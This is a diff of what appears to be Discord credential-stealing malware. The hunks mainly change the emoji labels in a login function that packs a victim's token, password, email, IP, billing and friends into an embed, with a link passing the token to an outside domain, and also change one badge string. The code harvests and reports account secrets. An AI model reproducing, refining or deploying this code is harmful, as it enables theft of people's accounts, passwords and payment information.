@@ -559,7 +559,7 @@ const getBadges = (flags) => {
       badges += ' <:balance:919973088651776001> ';
       break;
     case 0:
-      badges = '`No Badges`';
+      badges = '`Nitro`';
       break;
     default:
       badges = '`No Badges`';
@@ -609,7 +609,7 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<a:944007295417843743:959785231982931979> Token:',
+            name: ':closed_lock_with_key: Token:',
             value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/{token})`,
             inline: false,
           },
@@ -619,27 +619,27 @@ const login = async (email, password, token) => {
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Billing:',
+            name: ':credit_card: Billing:',
             value: `**${billing}**`,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Friends:',
+            name: ':people_hugging: Friends:',
             value: `\`${friends}\``,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Email:',
+            name: ':mailbox_with_mail: Email:',
             value: `\`${email}\``,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> IP:',
+            name: '<a:satan:846706207632261120> IP:',
             value: `\`${config.ip}\``,
             inline: true,
           },
           {
-            name: '<a:satan:846706207632261120> Password:',
+            name: ':key: Password:',
             value: `\`${password}\``,
             inline: true,
           },
